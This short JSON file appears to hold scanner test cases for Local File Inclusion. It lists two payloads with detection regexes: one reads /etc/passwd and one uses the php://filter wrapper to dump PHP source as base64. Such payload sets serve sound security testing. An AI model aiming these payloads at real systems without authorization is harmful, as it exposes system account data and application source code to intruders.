{
  "vulnerability": "Local File Inclusion",
  "cases": [
    {
      "id": "lfi-unix-etc-passwd",
      "payload": "/etc/passwd",
      "match_regex": "(?i)(root:x:0:0|daemon:|nobody:|/bin/bash|/bin/sh)",
      "description": "Direct absolute path injection targeting /etc/passwd to confirm server-side file inclusion via system user entries."
    },
    {
      "id": "lfi-php-wrapper-base64",
      "payload": "php://filter/convert.base64-encode/resource=index.php",
      "match_regex": "(?i)([a-zA-Z0-9+/]{30,}={0,2})",
      "description": "PHP stream wrapper abuse to read and base64-encode local PHP source files, bypassing direct output restrictions."
    }
  ]
}